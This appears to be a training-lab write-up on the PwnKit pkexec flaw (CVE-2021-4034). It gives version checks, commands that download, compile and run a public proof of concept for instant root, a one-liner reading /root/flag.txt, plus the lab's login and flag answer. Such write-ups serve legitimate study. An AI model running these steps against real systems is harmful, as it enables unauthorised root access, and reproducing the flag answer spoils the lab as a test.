# Section 24 — Polkit / PwnKit (CVE-2021-4034)

> Lab: `ACADEMY-LLPE-POLKIT` · `ssh htb-student@<T>` (`HTB_@cademy_stdnt!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — `/root/flag.txt` via PwnKit | **`HTB{p0Lk1tt3n}`** |

Exploited **CVE-2021-4034** (PwnKit) — pkexec 0.105 → compile PoC → instant root → flag.

---

## Concept

**pkexec** (part of polkit) runs programs as another user, similar to sudo. CVE-2021-4034 is a memory corruption vulnerability in pkexec's argument handling — when called with `argc=0` (no arguments), it reads/writes out of bounds, allowing arbitrary code execution as root.

**Why PwnKit matters for CPTS:**
- Affects virtually **every Linux system** with polkit installed (2009–2022)
- Works from **any unprivileged user** — no sudo, no SUID, no special permissions
- Dead simple: compile, run, root
- First thing to try on any Linux box

---

## Identify

```bash
pkexec --version                            # any version before Jan 2022 patch = vulnerable
# pkexec version 0.105                     ← vulnerable

# Alternative checks
which pkexec                                # is it installed?
dpkg -l policykit-1 2>/dev/null | tail -1   # package version
find / -name pkexec -perm -4000 2>/dev/null # SUID check (must be SUID)
```

---

## Exploit

```bash
# On attacker box: download PoC
curl -s https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c -o poc.c

# Transfer to target (scp, wget, python http.server, etc.)
scp poc.c user@target:/tmp/

# On target: compile and run
cd /tmp
gcc poc.c -o poc
./poc
# # id
# uid=0(root) gid=0(root)
```

**Non-interactive (SSH one-liner):**
```bash
echo 'cat /root/flag.txt' | ./poc
```

**If no gcc on target:** compile on attacker with matching GLIBC, or use a pre-compiled binary. The PoC is tiny (single .c file, no dependencies beyond libc), so GLIBC mismatches are less common than with complex exploits.

---

## Polkit Overview

| Component | Purpose |
|-----------|---------|
| `pkexec` | Run programs as another user (like sudo) — **PwnKit target** |
| `pkaction` | List available polkit actions |
| `pkcheck` | Check if a process is authorized for an action |
| `/usr/share/polkit-1/actions/` | Policy files (XML) defining available actions |
| `/usr/share/polkit-1/rules.d/` | JavaScript rules for authorization decisions |
| `/etc/polkit-1/localauthority/` | Local authority rules (`.pkla` files) |

**Normal pkexec usage:**
```bash
pkexec -u root id                           # run 'id' as root (prompts for auth)
pkexec /bin/bash                            # root shell (if authorized)
```

---

## Exam / Engagement Notes

- **PwnKit is the most universal local root exploit.** Try it on every Linux box — it works on nearly anything with polkit installed (Ubuntu, Debian, RHEL, Fedora, CentOS).
- No special permissions or sudo entries needed — works from any user.
- The PoC is a single C file with no external dependencies — trivial to compile.
- **Check before running:** `pkexec --version` and `ls -la $(which pkexec)` — needs to be SUID root.
- If pkexec is patched, fall back to kernel exploits (OverlayFS, DirtyPipe) or sudo vulns (Baron Samedit).
- On a real engagement, PwnKit may trigger EDR/AV. The arthepsy PoC is well-known and signatured.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (HTB_@cademy_stdnt!)
2. pkexec --version -> 0.105 (vulnerable to CVE-2021-4034)
3. Transfer poc.c to target, compile: gcc poc.c -o poc
4. echo 'cat /root/flag.txt' | ./poc
   -> HTB{p0Lk1tt3n}                        ✅
```

> One line: pkexec installed + unpatched polkit = CVE-2021-4034 → compile single .c file → instant root from any user.
